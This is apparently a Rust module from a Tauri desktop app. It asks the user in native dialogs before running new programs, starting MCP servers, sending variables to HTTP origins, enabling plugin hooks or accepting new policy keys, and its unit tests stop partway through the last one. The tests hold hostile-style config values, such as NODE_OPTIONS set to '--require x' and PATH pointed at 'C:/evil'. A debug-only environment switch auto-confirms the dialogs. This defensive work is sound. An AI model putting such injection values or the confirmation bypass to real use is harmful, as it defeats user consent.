//! Native confirmations for changes the webview must not make on its own (spec §12).

use std::future::Future;

use dots_core::library::{
    check_name, http_origin, origin_changed, HttpOrigin, LibraryConfig, LibraryItem, LibraryKind,
    McpCatalog, McpServerConfig,
};
use dots_core::library_service::{McpProbe, OriginToConfirm};
use dots_core::model::SettingsSaved;
use dots_core::settings::Settings;
use dots_core::vault::org::{OrgSummary, SourceCreds, KEY_CHANGE};
use dots_core::vault::{DotScope, Resolved};
use dots_core::Runtime;
use tauri::{AppHandle, Manager};
use tauri_plugin_dialog::{DialogExt, MessageDialogButtons, MessageDialogKind};

use crate::error::CmdError;

/// Debug builds accept `DOTS_CONFIRM=yes` in place of the dialog, so a smoke run can change
/// the Claude program without a person at the screen. Release builds always ask.
pub const CONFIRM_ENV: &str = "DOTS_CONFIRM";

/// The program a settings change would make Dots run as the Claude CLI, when that needs the
/// user's confirmation: a non-empty `claude_path` that differs from the stored one. Clearing
/// the path (back to searching `PATH`) and saving it unchanged need none. The caller passes the
/// path already normalized, and the comparison is exact: the string returned is the string that
/// is saved, so any difference, even in whitespace, needs the user's yes.
pub fn claude_program_to_confirm(current: Option<&str>, next: Option<&str>) -> Option<String> {
    let next = next.filter(|p| !p.trim().is_empty())?;
    (current != Some(next)).then(|| next.to_string())
}

pub fn claude_program_message(program: &str) -> String {
    format!(
        "Dots will run this program as the Claude CLI from the next start:\n\n{program}\n\n\
         Allow this only for a program you trust."
    )
}

/// The title of the question about a new Claude program.
pub const CLAUDE_TITLE: &str = "Change the Claude program?";
/// The title of the question about a new Edge program (browser spec section 6).
pub const EDGE_TITLE: &str = "Change the Edge program?";

/// The question about a new Edge program: Dots starts it for every dot that uses the browser.
pub fn edge_program_message(program: &str) -> String {
    format!(
        "Dots will run this program as Microsoft Edge for the dots that use the browser:\n\n\
         {program}\n\nAllow this only for a program you trust."
    )
}

/// Saves `settings`, after the user's yes when they name a new Claude program or a new Edge
/// program (browser spec section 6), asked in that order. `ask` is given the title and the
/// question and answers whether the user allowed it; the app passes the native dialog.
///
/// The order is the point of this function. The path is trimmed once, so the string compared,
/// shown and saved is the same one. Invalid settings are refused before anything is asked, so
/// the user never allows a save that then fails. Nothing is saved before the answer, and a "no"
/// answers `cancelled` with nothing changed.
pub async fn save_settings_confirmed<F, Fut>(
    rt: &Runtime,
    mut settings: Settings,
    mut ask: F,
) -> Result<SettingsSaved, CmdError>
where
    F: FnMut(&'static str, String) -> Fut,
    Fut: Future<Output = bool>,
{
    settings.claude_path = settings.claude_path.map(|p| p.trim().to_string());
    settings.edge_path = settings.edge_path.map(|p| p.trim().to_string());
    settings.validate()?;
    let stored = rt.settings().await;
    if let Some(program) = claude_program_to_confirm(
        stored.claude_path.as_deref(),
        settings.claude_path.as_deref(),
    ) {
        if !ask(CLAUDE_TITLE, claude_program_message(&program)).await {
            return Err(CmdError::cancelled("the Claude program was not changed"));
        }
    }
    // The same rule for the Edge program: only a new, non-empty path asks.
    if let Some(program) =
        claude_program_to_confirm(stored.edge_path.as_deref(), settings.edge_path.as_deref())
    {
        if !ask(EDGE_TITLE, edge_program_message(&program)).await {
            return Err(CmdError::cancelled("the Edge program was not changed"));
        }
    }
    Ok(rt.update_settings(settings).await?)
}

/// The question to ask before Dots runs or stores what a Library `config` names, or `None`
/// when none is needed. `stored` is the item's config now (`None` for a new item or a probe).
/// Every part of a command line, folder, key, origin and plugin command line shows in double
/// quotes with `"` and `\` escaped (a control or direction character, which the core refuses in a
/// config, as `\u{..}`), so where one part ends is visible.
/// - A stdio MCP server whose `command`, `args`, `cwd` or `env` differ from the stored ones (a
///   new server differs): Dots would start that program. `env` is compared as stored, the
///   `${VAR}` text, and the question names its keys, never values.
/// - An http MCP server whose `url` or header values name `${VAR}`: Dots would send the values of
///   those variables to the URL's origin. It asks when the origin or the set of variable names is
///   new or changed (a stored stdio server or other kind counts as new). Names, never values.
/// - A plugin that starts stdio servers or has http servers that send variables (a plugin author
///   writes its `.mcp.json`): `plugin_starts` holds their (quoted) command lines and
///   `the values of A to "origin"` entries, which
///   the caller read from the plugin's `.mcp.json` when the plugin is new or its path changed
///   (and left empty otherwise). It is combined with
/// - a plugin whose hooks are newly on: `run_hooks` went from off to on, or is on at a new path
///   (a new plugin counts as off). Its hooks run commands without approval.
///
/// Anything else, a header literal change included, needs none. This function reads no disk.
pub fn library_confirmation(
    stored: Option<&LibraryConfig>,
    next: &LibraryConfig,
    plugin_starts: &[String],
) -> Option<String> {
    library_confirmation_in(stored, next, plugin_starts, &|_| None)
}

/// `library_confirmation` with the environment the origin is computed from. The origin shown is
/// the one the HTTP client reaches after `${VAR}` in the URL is expanded, not the text read
/// first: a variable holding a `/` or `\` moves the host.
pub fn library_confirmation_in(
    stored: Option<&LibraryConfig>,
    next: &LibraryConfig,
    plugin_starts: &[String],
    env: &dyn Fn(&str) -> Option<String>,
) -> Option<String> {
    match next {
        LibraryConfig::McpServer(McpServerConfig::Stdio {
            command,
            args,
            cwd,
            env,
        }) => {
            if let Some(LibraryConfig::McpServer(McpServerConfig::Stdio {
                command: c,
                args: a,
                cwd: w,
                env: e,
            })) = stored
            {
                if (c, a, w, e) == (command, args, cwd, env) {
                    return None;
                }
            }
            let place = cwd
                .as_deref()
                .map(|d| format!(" in {}", quoted(d)))
                .unwrap_or_default();
            let keys = if env.is_empty() {
                String::new()
            } else {
                let keys: Vec<String> = env.keys().map(|k| quoted(k)).collect();
                format!(" with env {}", keys.join(", "))
            };
            Some(format!(
                "Dots will run: {}{place}{keys}. Run it?\n\nAllow this only for a program you trust.",
                command_line(command, args)
            ))
        }
        LibraryConfig::McpServer(server @ McpServerConfig::Http { url, .. }) => {
            let variables = server.variables();
            if variables.is_empty() {
                return None;
            }
            if let Some(LibraryConfig::McpServer(old @ McpServerConfig::Http { url: u, .. })) =
                stored
            {
                if !origin_changed(u, url, env) && old.variables() == variables {
                    return None;
                }
            }
            Some(format!(
                "Dots will send the values of {} to {}. Send them?\n\nAllow this only for a \
                 server you trust.",
                variables.join(", "),
                origin_text(url, env)
            ))
        }
        LibraryConfig::Plugin(p) => {
            let was_on = matches!(
                stored,
                Some(LibraryConfig::Plugin(old)) if old.run_hooks && old.path == p.path
            );
            let hooks = p.run_hooks && !was_on;
            // An entry `the values of A to "origin"` is an http server that sends variables;
            // any other is a stdio command line.
            let (sends, starts): (Vec<&String>, Vec<&String>) = plugin_starts
                .iter()
                .partition(|e| e.starts_with(SENDS_PREFIX));
            if starts.is_empty() && sends.is_empty() {
                return hooks.then(|| {
                    "This plugin's hooks run commands on their own, without approval, and can approve tool calls. Run them?"
                        .to_string()
                });
            }
            let join = |v: &[&String]| v.iter().map(|e| e.as_str()).collect::<Vec<_>>().join("; ");
            let mut text = match (starts.is_empty(), sends.is_empty()) {
                (false, true) => format!("This plugin starts: {}.", join(&starts)),
                (true, _) => format!("This plugin sends {}.", join(&sends)),
                (false, false) => format!(
                    "This plugin starts: {}. It sends {}.",
                    join(&starts),
                    join(&sends)
                ),
            };
            if hooks {
                text.push_str(
                    " Its hooks also run commands on their own, without approval, and can approve tool calls.",
                );
            }
            text.push_str(" Add it?");
            Some(text)
        }
        _ => None,
    }
}

/// Where `url` sends its requests, for a dialog: the quoted ASCII origin, with the Unicode host
/// in parentheses when it differs. When there is no origin (a variable that is not set, text
/// that is no URL), the quoted URL and why the server cannot start.
fn origin_text(url: &str, env: &dyn Fn(&str) -> Option<String>) -> String {
    match http_origin(url, env) {
        Ok(o) => shown_origin(&o),
        Err(why) if why.ends_with("is not set") => format!(
            "{} ({why}: the server cannot start until it is set)",
            quoted(url)
        ),
        Err(why) => format!("{} ({why}: the server cannot start)", quoted(url)),
    }
}

/// An origin for a dialog: quoted in ASCII, with the Unicode host in parentheses when it
/// differs.
fn shown_origin(origin: &HttpOrigin) -> String {
    match &origin.unicode {
        Some(u) => format!("{} ({u})", quoted(&origin.ascii)),
        None => quoted(&origin.ascii),
    }
}

/// The question before an http MCP server may send a scope's values to the origin its URL
/// reaches there: the words of the server form's question, naming the org whose values they
/// are. Names, never values.
pub fn origin_question(asked: &OriginToConfirm, scope: &DotScope) -> String {
    let whose = match scope {
        DotScope::Personal => String::new(),
        DotScope::Org(_) => format!(" in {}", asked.scope_name),
    };
    format!(
        "Dots will send the values of {}{whose} to {}. Send them?\n\nAllow this only for a \
         server you trust.",
        asked.variables.join(", "),
        shown_origin(&asked.origin)
    )
}

/// The scope a command names: an org id, or none for Personal.
pub fn scope_of(scope: Option<String>) -> DotScope {
    scope.map_or(DotScope::Personal, DotScope::Org)
}

/// The title of the dialog for a question `library_confirmation` made.
pub fn library_title(question: &str) -> &'static str {
    if question.starts_with("Dots will send") {
        "Send these variables?"
    } else if question.starts_with("This plugin") {
        "Add this plugin?"
    } else {
        "Run this program?"
    }
}

/// `text` in double quotes, `"` and `\` escaped, a control or direction character as `\u{..}`.
fn quoted(text: &str) -> String {
    let mut out = String::from("\"");
    for c in text.chars() {
        match c {
            '"' | '\\' => {
                out.push('\\');
                out.push(c);
            }
            c if c.is_control()
                || matches!(c, '\u{061C}' | '\u{200E}' | '\u{200F}' | '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}') =>
            {
                out.push_str(&format!("\\u{{{:04X}}}", c as u32));
            }
            c => out.push(c),
        }
    }
    out.push('"');
    out
}

fn command_line(command: &str, args: &[String]) -> String {
    std::iter::once(command)
        .chain(args.iter().map(String::as_str))
        .map(quoted)
        .collect::<Vec<_>>()
        .join(" ")
}

/// The command lines of the stdio servers, and the variables and origin of the http servers that
/// name `${VAR}`, in the plugin folder `config` names, for the question
/// of `library_confirmation`, read from `info` (`plugin_info`), each origin with `${VAR}` read
/// through `env`.
fn plugin_starts(
    info: Option<&dots_core::kit::PluginInfo>,
    env: &dyn Fn(&str) -> Option<String>,
) -> Vec<String> {
    let Some(info) = info else {
        return Vec::new();
    };
    info.servers
        .iter()
        .filter_map(|s| match &s.config {
            McpServerConfig::Stdio { command, args, .. } => Some(command_line(command, args)),
            http @ McpServerConfig::Http { url, .. } => {
                let variables = http.variables();
                (!variables.is_empty()).then(|| {
                    format!(
                        "{SENDS_PREFIX}{} to {}",
                        variables.join(", "),
                        origin_text(url, env)
                    )
                })
            }
        })
        .collect()
}

/// Starts an entry of `plugin_starts` for an http server that sends variables.
const SENDS_PREFIX: &str = "the values of ";

/// The plugin folder `config` names, read for the question of `library_confirmation`: only
/// when the plugin is new (`stored` is `None`) or its path changed. A folder that cannot be
/// read gives none, and the core then refuses it.
fn plugin_info(
    stored: Option<&LibraryConfig>,
    config: &LibraryConfig,
) -> Option<dots_core::kit::PluginInfo> {
    let LibraryConfig::Plugin(next) = config else {
        return None;
    };
    if matches!(stored, Some(LibraryConfig::Plugin(old)) if old.path == next.path) {
        return None;
    }
    dots_core::kit::read_plugin(std::path::Path::new(&next.path)).ok()
}

/// What the person allowed in `confirm_library`'s question: the origins it named, each in ASCII
/// as the HTTP client reaches it with Personal's values, and those values. Empty when nothing
/// was asked, or the question named no origin that could be computed.
struct Allowed {
    origins: Vec<String>,
    personal: Resolved,
}

impl Allowed {
    /// The Personal origin of `config` when the question named it.
    fn origin_of(&self, config: &LibraryConfig) -> Option<String> {
        let LibraryConfig::McpServer(server @ McpServerConfig::Http { url, .. }) = config else {
            return None;
        };
        if !server.origin_pinned() {
            return None;
        }
        let origin = http_origin(url, &|k| self.personal.get(k)).ok()?.ascii;
        self.origins.contains(&origin).then_some(origin)
    }
}

/// Asks `library_confirmation`'s question, if there is one, with each origin computed from
/// Personal's values, where the server's `${VAR}` resolve. A refusal is `cancelled`, and the
/// caller then starts and stores nothing. An answer of yes returns the origins the question
/// named, for `record_allowed` once the save is done.
async fn confirm_library<F, Fut>(
    rt: &Runtime,
    stored: Option<&LibraryConfig>,
    next: &LibraryConfig,
    ask: F,
) -> Result<Allowed, CmdError>
where
    F: FnOnce(String) -> Fut,
    Fut: Future<Output = bool>,
{
    let info = plugin_info(stored, next);
    let mut names = Vec::new();
    for config in [stored, Some(next)].into_iter().flatten() {
        if let LibraryConfig::McpServer(server) = config {
            names.extend(server.variables());
        }
    }
    for server in info.iter().flat_map(|i| &i.servers) {
        names.extend(server.config.variables());
    }
    let personal = rt.vault().personal_values(&names).await?;
    let env = |k: &str| personal.get(k);
    let starts = plugin_starts(info.as_ref(), &env);
    let mut origins = Vec::new();
    if let Some(question) = library_confirmation_in(stored, next, &starts, &env) {
        if !ask(question).await {
            return Err(CmdError::cancelled("declined: nothing was run or saved"));
        }
        // The origins the question named: the server's, or each of the plugin's http servers
        // that send variables.
        let named = match next {
            LibraryConfig::McpServer(server) => vec![server],
            _ => info
                .iter()
                .flat_map(|i| &i.servers)
                .map(|s| &s.config)
                .collect(),
        };
        for server in named {
            if let McpServerConfig::Http { url, .. } = server {
                if server.origin_pinned() {
                    origins.extend(http_origin(url, &env).ok().map(|o| o.ascii));
                }
            }
        }
    }
    Ok(Allowed { origins, personal })
}

/// Records, after a save the person allowed, the Personal origin the question named of each
/// http server the save holds: the server `item`, or the plugin `item`'s own servers. A server
/// whose origin the question did not name (nothing relevant changed, so nothing was asked)
/// keeps the origins confirmed before.
async fn record_allowed(
    rt: &Runtime,
    item: &LibraryItem,
    allowed: &Allowed,
) -> Result<(), CmdError> {
    if allowed.origins.is_empty() {
        return Ok(());
    }
    let servers = match item.config {
        LibraryConfig::Plugin(_) => rt.store().owned_library_items(&item.id).await?,
        _ => vec![item.clone()],
    };
    for server in servers {
        if let Some(origin) = allowed.origin_of(&server.config) {
            rt.library()
                .add_confirmed_origin(&server.id, &DotScope::Personal, &origin)
                .await?;
        }
    }
    Ok(())
}

/// `library_probe`, after the user's yes when the config is a stdio server.
pub async fn probe_confirmed<F, Fut>(
    rt: &Runtime,
    config: McpServerConfig,
    ask: F,
) -> Result<McpProbe, CmdError>
where
    F: FnOnce(String) -> Fut,
    Fut: Future<Output = bool>,
{
    let next = LibraryConfig::McpServer(config);
    // Refused before it is asked: the person never allows what the core would refuse.
    next.validate()?;
    confirm_library(rt, None, &next, ask).await?;
    let LibraryConfig::McpServer(config) = next else {
        unreachable!("wrapped above")
    };
    Ok(rt.library().probe(&config).await?)
}

/// `library_add`, after the user's yes when it adds a stdio server or a plugin with hooks on,
/// or an http server that sends variables. The Personal origin that question named is then
/// recorded as confirmed (env vault spec §8), so a Personal dot's run starts the server there.
pub async fn add_confirmed<F, Fut>(
    rt: &Runtime,
    name: &str,
    config: LibraryConfig,
    accept: Option<&str>,
    ask: F,
) -> Result<LibraryItem, CmdError>
where
    F: FnOnce(String) -> Fut,
    Fut: Future<Output = bool>,
{
    config.validate()?;
    check_name(config.kind(), name)?;
    if accept.is_some() && config.kind() != LibraryKind::McpServer {
        return Err(dots_core::Error::Invalid(
            "only an MCP server has a tool list to accept".into(),
        )
        .into());
    }
    let allowed = confirm_library(rt, None, &config, ask).await?;
    let item = rt.library().add(name, config, None).await?;
    record_allowed(rt, &item, &allowed).await?;
    // Checked once the origin the person allowed is recorded, so the Check may reach it.
    if let Some(fp) = accept {
        match rt
            .library()
            .check_and_accept(&item.id, &DotScope::Personal, fp)
            .await
        {
            Ok(_) => {}
            // An origin the question could not name: nothing was sent, and it stays unchecked.
            Err(dots_core::Error::Conflict(why)) => tracing::warn!("{why}; saved unchecked"),
            Err(e) => return Err(e.into()),
        }
    }
    Ok(item)
}

/// `library_update`, after the user's yes when the stored config does not already hold what is
/// asked for: another stdio command line, hooks switched on, or variables sent to another
/// origin. After a yes the Personal origin the question named is recorded as confirmed; with no
/// question the origins confirmed before stay.
pub async fn update_confirmed<F, Fut>(
    rt: &Runtime,
    id: &str,
    config: LibraryConfig,
    ask: F,
) -> Result<LibraryItem, CmdError>
where
    F: FnOnce(String) -> Fut,
    Fut: Future<Output = bool>,
{
    let stored = rt
        .library()
        .list()
        .await?
        .into_iter()
        .find(|e| e.item.id == id)
        .map(|e| e.item);
    // An id the Library does not have is the core's `not_found`, before any question. So is
    // what the core refuses: a bad config, another kind, a plugin's own server.
    if let Some(stored) = &stored {
        config.validate()?;
        if stored.config.kind() != config.kind() {
            return Err(dots_core::Error::Invalid(format!(
                "the {} {:?} cannot become a {}",
                stored.config.kind().label(),
                stored.name,
                config.kind().label()
            ))
            .into());
        }
        if stored.owner_id.is_some() {
            return Err(dots_core::Error::Invalid(format!(
                "the MCP server {:?} comes with a plugin; change the plugin instead",
                stored.name
            ))
            .into());
        }
        let allowed = confirm_library(rt, Some(&stored.config), &config, ask).await?;
        let item = rt.library().update(id, config).await?;
        record_allowed(rt, &item, &allowed).await?;
        return Ok(item);
    }
    Ok(rt.library().update(id, config).await?)
}

/// Asks `asked`'s question for the server `id` in `scope`, and records the origin after a yes.
/// A no answers `cancelled`, with nothing sent or recorded.
async fn confirm_asked<F, Fut>(
    rt: &Runtime,
    id: &str,
    scope: &DotScope,
    asked: &OriginToConfirm,
    ask: F,
) -> Result<(), CmdError>
where
    F: FnOnce(String) -> Fut,
    Fut: Future<Output = bool>,
{
    if !ask(origin_question(asked, scope)).await {
        return Err(CmdError::cancelled("declined: nothing was sent or saved"));
    }
    rt.library()
        .add_confirmed_origin(id, scope, &asked.origin.ascii)
        .await?;
    Ok(())
}

/// `library_check` in `scope` (env vault spec §8). The core refuses to check a pinned server
/// whose origin in that scope is not confirmed; then this asks, with that origin and the
/// server's variables, and a yes records the origin and checks. A no answers `cancelled`, and
/// nothing is sent.
pub async fn check_confirmed<F, Fut>(
    rt: &Runtime,
    id: &str,
    scope: &DotScope,
    ask: F,
) -> Result<McpCatalog, CmdError>
where
    F: FnOnce(String) -> Fut,
    Fut: Future<Output = bool>,
{
    let library = rt.library();
    let refused = match library.check(id, scope).await {
        Err(dots_core::Error::Conflict(why)) => why,
        other => return Ok(other?),
    };
    // A conflict that no longer holds is answered as it came; a failure to ask is its own.
    let Some(asked) = library.origin_to_confirm(id, scope).await? else {
        return Err(dots_core::Error::Conflict(refused).into());
    };
    confirm_asked(rt, id, scope, &asked, ask).await?;
    Ok(library.check(id, scope).await?)
}

/// `confirm_origin`: the question of `check_confirmed` and its record, without the Check. It
/// works for a plugin's own server, which the server form cannot change. An origin confirmed
/// already asks nothing.
pub async fn origin_confirmed<F, Fut>(
    rt: &Runtime,
    id: &str,
    scope: &DotScope,
    ask: F,
) -> Result<(), CmdError>
where
    F: FnOnce(String) -> Fut,
    Fut: Future<Output = bool>,
{
    match rt.library().origin_to_confirm(id, scope).await? {
        Some(asked) => confirm_asked(rt, id, scope, &asked, ask).await,
        None => Ok(()),
    }
}

/// The title of the question before an Update that brings a new policy key.
pub const KEY_TITLE: &str = "Accept the new policy key?";

/// The question before an Update that brings a new policy key: the preview's warning.
pub fn key_question(org: &str, warning: &str) -> String {
    format!("{org}: {warning}.\n\nUpdate {org} with this code?")
}

/// `org_update`, after the person's yes when the code brings a new policy key (env vault spec
/// §6.4): the key that signs the org's policy decides what Dots trusts, so the warning of
/// `org_preview` is asked in a dialog the webview cannot answer. A no answers `cancelled` and
/// nothing is fetched or changed. A code for another org is the core's refusal, unasked.
pub async fn update_org_confirmed<F, Fut>(
    rt: &Runtime,
    org_id: &str,
    code: &str,
    creds: Option<SourceCreds>,
    ask: F,
) -> Result<OrgSummary, CmdError>
where
    F: FnOnce(String) -> Fut,
    Fut: Future<Output = bool>,
{
    let preview = rt.preview_org(code)?;
    // The core's comparison of the whole policy keys decides, never the key id (which whoever
    // makes a key can set) or the words of a line. A code for another org, or an org not
    // joined, is the core's refusal, unasked.
    if preview.org_id == org_id && preview.key_changed {
        let warning = preview
            .changes
            .iter()
            .find(|c| c.starts_with(KEY_CHANGE))
            .cloned()
            .unwrap_or_else(|| {
                format!(
                    "{KEY_CHANGE} to {}: the key that signs the org's policy is new, so accept                      this code only if your admin told you the key changed",
                    preview.key_fingerprint
                )
            });
        if !ask(key_question(&preview.name, &warning)).await {
            return Err(CmdError::cancelled("the org was not updated"));
        }
    }
    Ok(rt.update_org(org_id, code, creds).await?)
}

/// Whether the environment answers confirmations instead of the user.
pub fn preconfirmed(debug_build: bool, env: Option<&str>) -> bool {
    debug_build && env == Some("yes")
}

/// Asks in a native dialog, which the webview cannot answer. `false` when declined or closed.
pub async fn ask(app: &AppHandle, title: &str, message: String) -> bool {
    let env = std::env::var(CONFIRM_ENV).ok();
    if preconfirmed(cfg!(debug_assertions), env.as_deref()) {
        tracing::warn!("{CONFIRM_ENV}=yes: confirmed without a dialog: {title}");
        return true;
    }
    let (tx, rx) = tokio::sync::oneshot::channel();
    let mut dialog = app
        .dialog()
        .message(message)
        .title(title)
        .kind(MessageDialogKind::Warning)
        .buttons(MessageDialogButtons::OkCancelCustom(
            "Allow".into(),
            "Cancel".into(),
        ));
    if let Some(window) = app.get_webview_window("main") {
        dialog = dialog.parent(&window);
    }
    dialog.show(move |allowed| {
        let _ = tx.send(allowed);
    });
    rx.await.unwrap_or(false)
}

#[cfg(test)]
mod tests {
    use super::*;
    use dots_core::vault::EntryKind;

    /// `plugin_starts` of the plugin `config` names, with no variable set.
    fn starts_of(stored: Option<&LibraryConfig>, config: &LibraryConfig) -> Vec<String> {
        plugin_starts(plugin_info(stored, config).as_ref(), &|_| None)
    }
    use crate::error::CmdErrorKind;

    #[test]
    fn only_a_new_program_needs_confirmation() {
        let ask = claude_program_to_confirm;
        assert_eq!(
            ask(None, Some("C:/x/claude.exe")),
            Some("C:/x/claude.exe".into())
        );
        // Exact: the string shown is the string saved, so it is returned as given.
        assert_eq!(
            ask(Some("C:/a.exe"), Some("C:/b.exe")),
            Some("C:/b.exe".into())
        );
        assert_eq!(
            ask(Some("C:/a.exe"), Some("C:/a.exe\u{a0}")),
            Some("C:/a.exe\u{a0}".into())
        );
        assert_eq!(
            ask(Some("C:/a.exe"), Some(" C:/a.exe")),
            Some(" C:/a.exe".into())
        );
        assert_eq!(
            ask(Some("C:/a.exe "), Some("C:/a.exe")),
            Some("C:/a.exe".into())
        );
        // Unchanged, cleared, or empty (which validation rejects anyway): no dialog.
        assert_eq!(ask(Some("C:/a.exe"), Some("C:/a.exe")), None);
        assert_eq!(ask(Some("C:/a.exe"), None), None);
        assert_eq!(ask(None, None), None);
        assert_eq!(ask(None, Some("  ")), None);
    }

    fn stdio(command: &str, args: &[&str], cwd: Option<&str>) -> LibraryConfig {
        LibraryConfig::McpServer(McpServerConfig::Stdio {
            command: command.into(),
            args: args.iter().map(|a| a.to_string()).collect(),
            cwd: cwd.map(String::from),
            env: Default::default(),
        })
    }

    fn plugin(run_hooks: bool) -> LibraryConfig {
        LibraryConfig::Plugin(dots_core::library::PluginConfig {
            path: "C:/p".into(),
            installed_id: None,
            run_hooks,
        })
    }

    fn http() -> LibraryConfig {
        LibraryConfig::McpServer(McpServerConfig::Http {
            url: "http://127.0.0.1:1/mcp".into(),
            headers: Default::default(),
        })
    }

    #[test]
    fn a_stdio_command_line_needs_a_yes_unless_it_is_the_stored_one() {
        let q = |s: Option<&LibraryConfig>, n: &LibraryConfig| library_confirmation(s, n, &[]);
        let next = stdio("npx", &["-y", "srv"], Some("C:/d"));
        let asked = q(None, &next).unwrap();
        assert!(asked.starts_with(r#"Dots will run: "npx" "-y" "srv" in "C:/d". Run it?"#));
        // Without a folder the question names none.
        assert!(q(None, &stdio("srv", &[], None))
            .unwrap()
            .starts_with(r#"Dots will run: "srv". Run it?"#));
        // The same command line, args, folder and env: no question.
        assert_eq!(q(Some(&next), &next), None);
        // Any difference in the command, an argument or the folder asks.
        for other in [
            stdio("node", &["-y", "srv"], Some("C:/d")),
            stdio("npx", &["-y", "evil"], Some("C:/d")),
            stdio("npx", &["-y", "srv"], Some("C:/e")),
            stdio("npx", &["-y", "srv"], None),
        ] {
            assert!(q(Some(&next), &other).is_some(), "{other:?}");
        }
        // Stored as another kind or transport: new for this purpose.
        assert!(q(Some(&http()), &next).is_some());
        assert!(q(Some(&plugin(false)), &next).is_some());
    }

    fn stdio_env(env: &[(&str, &str)]) -> LibraryConfig {
        LibraryConfig::McpServer(McpServerConfig::Stdio {
            command: "npx".into(),
            args: vec!["srv".into()],
            cwd: None,
            env: env
                .iter()
                .map(|(k, v)| (k.to_string(), v.to_string()))
                .collect(),
        })
    }

    #[test]
    fn a_change_of_env_asks_and_names_the_keys_but_not_the_values() {
        let q = |s: Option<&LibraryConfig>, n: &LibraryConfig| library_confirmation(s, n, &[]);
        let stored = stdio_env(&[("A", "${A}")]);
        assert_eq!(q(Some(&stored), &stdio_env(&[("A", "${A}")])), None);
        // A value (the stored text), a key added, a key removed.
        for next in [
            stdio_env(&[("A", "${B}")]),
            stdio_env(&[("A", "${A}"), ("NODE_OPTIONS", "--require x")]),
            stdio_env(&[]),
        ] {
            assert!(q(Some(&stored), &next).is_some(), "{next:?}");
        }
        let asked = q(
            Some(&stored),
            &stdio_env(&[("PATH", "C:/evil"), ("NODE_OPTIONS", "--require x")]),
        )
        .unwrap();
        assert!(
            asked.starts_with(
                r#"Dots will run: "npx" "srv" with env "NODE_OPTIONS", "PATH". Run it?"#
            ),
            "{asked}"
        );
        assert!(!asked.contains("evil") && !asked.contains("--require"));
        // With a folder the keys follow it.
        let LibraryConfig::McpServer(McpServerConfig::Stdio {
            command, args, env, ..
        }) = stdio_env(&[("A", "${A}")])
        else {
            unreachable!()
        };
        let in_dir = LibraryConfig::McpServer(McpServerConfig::Stdio {
            command,
            args,
            cwd: Some("C:/d".into()),
            env,
        });
        assert!(q(None, &in_dir)
            .unwrap()
            .starts_with(r#"Dots will run: "npx" "srv" in "C:/d" with env "A". Run it?"#));
    }

    #[test]
    fn a_plugin_that_starts_servers_asks_with_their_command_lines_and_the_hooks_in_one_dialog() {
        let starts = vec!["node a.js --x".to_string(), "uvx b".to_string()];
        let q = library_confirmation;
        // Servers only.
        assert_eq!(
            q(None, &plugin(false), &starts).unwrap(),
            "This plugin starts: node a.js --x; uvx b. Add it?"
        );
        // Servers and hooks: one question.
        assert_eq!(
            q(None, &plugin(true), &starts).unwrap(),
            "This plugin starts: node a.js --x; uvx b. Its hooks also run commands on their own, \
             without approval, and can approve tool calls. Add it?"
        );
        // A plugin with hooks already on, and servers to start, asks about the servers only.
        assert_eq!(
            q(Some(&plugin(true)), &plugin(true), &starts).unwrap(),
            "This plugin starts: node a.js --x; uvx b. Add it?"
        );
        // Nothing to start and nothing switched on: no question.
        assert_eq!(q(None, &plugin(false), &[]), None);
        assert_eq!(q(Some(&plugin(true)), &plugin(true), &[]), None);
    }

    #[test]
    fn the_plugin_servers_are_read_for_a_new_plugin_or_a_new_path_only() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join(".mcp.json"),
            r#"{"mcpServers":{"a":{"command":"node","args":["a.js"]},"b":{"type":"http","url":"http://127.0.0.1:1/mcp"}}}"#,
        )
        .unwrap();
        let at = |path: &std::path::Path| {
            LibraryConfig::Plugin(dots_core::library::PluginConfig {
                path: path.to_string_lossy().into_owned(),
                installed_id: None,
                run_hooks: false,
            })
        };
        let config = at(dir.path());
        // New: the stdio server's command line; the HTTP one starts nothing.
        assert_eq!(starts_of(None, &config), [r#""node" "a.js""#]);
        // Same path: not read, not asked again.
        assert!(starts_of(Some(&config), &config).is_empty());
        // Another path: read again.
        let elsewhere = at(std::path::Path::new("C:/no/such/plugin"));
        assert_eq!(starts_of(Some(&elsewhere), &config), [r#""node" "a.js""#]);
        // Unreadable: nothing here; the core refuses the folder.
        assert!(starts_of(None, &elsewhere).is_empty());
        // Not a plugin.
        assert!(starts_of(None, &stdio("x", &[], None)).is_empty());
    }

    #[test]
    fn a_http_server_and_a_skill_need_no_question() {
        let skill = LibraryConfig::Skill(dots_core::library::SkillConfig {
            path: "C:/s".into(),
        });
        assert_eq!(library_confirmation(None, &http(), &[]), None);
        assert_eq!(library_confirmation(None, &skill, &[]), None);
    }

    #[test]
    fn hooks_ask_only_when_they_go_from_off_to_on() {
        let q = |s: Option<&LibraryConfig>, n: &LibraryConfig| library_confirmation(s, n, &[]);
        let asked = q(Some(&plugin(false)), &plugin(true)).unwrap();
        assert_eq!(
            asked,
            "This plugin's hooks run commands on their own, without approval, and can approve \
             tool calls. Run them?"
        );
        // A new plugin with hooks on switches them on from nothing.
        assert!(q(None, &plugin(true)).is_some());
        assert_eq!(q(Some(&plugin(true)), &plugin(true)), None);
        assert_eq!(q(Some(&plugin(true)), &plugin(false)), None);
        assert_eq!(q(Some(&plugin(false)), &plugin(false)), None);
        assert_eq!(q(None, &plugin(false)), None);
    }

    #[test]
    fn a_moved_plugin_with_hooks_on_asks_about_the_hooks_again() {
        let at = |path: &str, run_hooks: bool| {
            LibraryConfig::Plugin(dots_core::library::PluginConfig {
                path: path.into(),
                installed_id: None,
                run_hooks,
            })
        };
        let (a, b) = (at("C:/a", true), at("C:/b", true));
        // The same path, hooks already on: nothing. Another path: the hooks are new there.
        assert_eq!(library_confirmation(Some(&a), &a, &[]), None);
        let asked = library_confirmation(Some(&a), &b, &[]).unwrap();
        assert!(asked.contains("hooks run commands"), "{asked}");
        let starts = vec![r#""node" "x.js""#.to_string()];
        let asked = library_confirmation(Some(&a), &b, &starts).unwrap();
        assert!(asked.contains("Its hooks also run commands"), "{asked}");
        // Moved with hooks off: no hooks sentence.
        assert_eq!(
            library_confirmation(Some(&a), &at("C:/b", false), &[]),
            None
        );
    }

    #[test]
    fn every_part_shows_quoted_so_the_boundaries_are_visible() {
        let q = |n: &LibraryConfig| library_confirmation(None, n, &[]).unwrap();
        // One argument with a space is not two.
        let one = q(&stdio("node", &["a b"], None));
        let two = q(&stdio("node", &["a", "b"], None));
        assert!(
            one.starts_with(r#"Dots will run: "node" "a b". Run it?"#),
            "{one}"
        );
        assert_ne!(one, two);
